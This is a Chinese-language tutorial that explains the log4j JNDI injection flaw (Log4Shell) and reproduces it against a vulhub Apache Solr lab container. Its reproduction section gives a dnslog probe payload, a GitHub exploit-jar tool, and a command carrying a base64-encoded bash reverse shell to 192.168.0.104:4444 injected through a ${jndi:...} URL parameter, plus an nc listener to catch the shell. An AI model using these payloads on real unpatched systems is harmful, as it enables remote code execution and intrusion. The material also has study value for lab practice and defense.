# 前言：

JNDI (Java Naming and Directory Interface，JAVA 命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。
简单理解：有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了
不同的数据源肯定有不同的查找方式，使用 JNDI 也只是一个上层封装，在它下面也支持很多种具体的数据源。

LDAP (轻量级目录访问协议)
有一个类似于字典的数据源，你可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。

# 原理：

假如某一个 Java 程序中，将浏览器的类型记录到了日志中：
String userAgent = request.getHeader("User-Agent");
logger.info(userAgent);
这个 UA 头是外界输入的可被自定义的值，若其中是这样一串字符
${jndi:ldap://127.0.0.1/exploit}
log4j 将会对这行要输出的字符串进行解析。
首先，它发现了字符串中有 ${}，知道这个里面包裹的内容是要单独处理的。
进一步解析，发现是 JNDI 扩展内容。
再进一步，发现是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。
最后，调用具体复制 LDAP 的模块去请求对应的数据。
问题就出在这个请求数据可以请求 Java 对象，java 对象一般只存在于内存中，单页可以通过序列化的方式将其存储到文件中，或者通过网络传输。
更危险的在于：JNDI 还支持一个叫命名引用 (Naming References) 的方式，可以通过远程下载一个 class 文件，然后下载后加载起来构建对象。
核心问题：JNDI 可以远程下载 class 文件来构建对象！
如果远程下载的 url 指向的是一个恶意攻击的服务器，下载的 class 文件里面含有恶意代码，本地服务器就 G 了

# 漏洞复现：

①kali docker 启动漏洞环境
cd /home/ayu/vulhub/log4j
docker-compose up -d
②访问 ip:8983web 界面（是个 apache solr 界面

③bp 抓取刷新界面数据包（需要放两个包，得到 accept 有 json 方法的包

/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.4zybrx.dnslog.cn}
拼接路径访问 dnslog，状态码为 400 且 dnslog 有访问记录算存在漏洞


④进一步利用 log4j getshell
JNDI 工具地址：

https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

下载工具：

git clone https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA0LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "192.168.0.104"
(base64 的内容为 bash -i>& /dev/tcp/ 要反弹的 ip / 端口号 0>&1，-A “工具所在的 ip”)

工具运行生成如下界面，会有几个紫色字体 payload 生成，直接拼接到 /solr/admin/cores?action=${jndi:payload}

Windows10 开启 nc 监听

若 一个 payload 没反弹成功就多试两个，成功了 nc 直接获得反弹 shell（且这个反弹 shell 不会乱码，试验过在 kali 端直接执行 bash 反弹过来的 shell 都会乱码，工具有点顶）
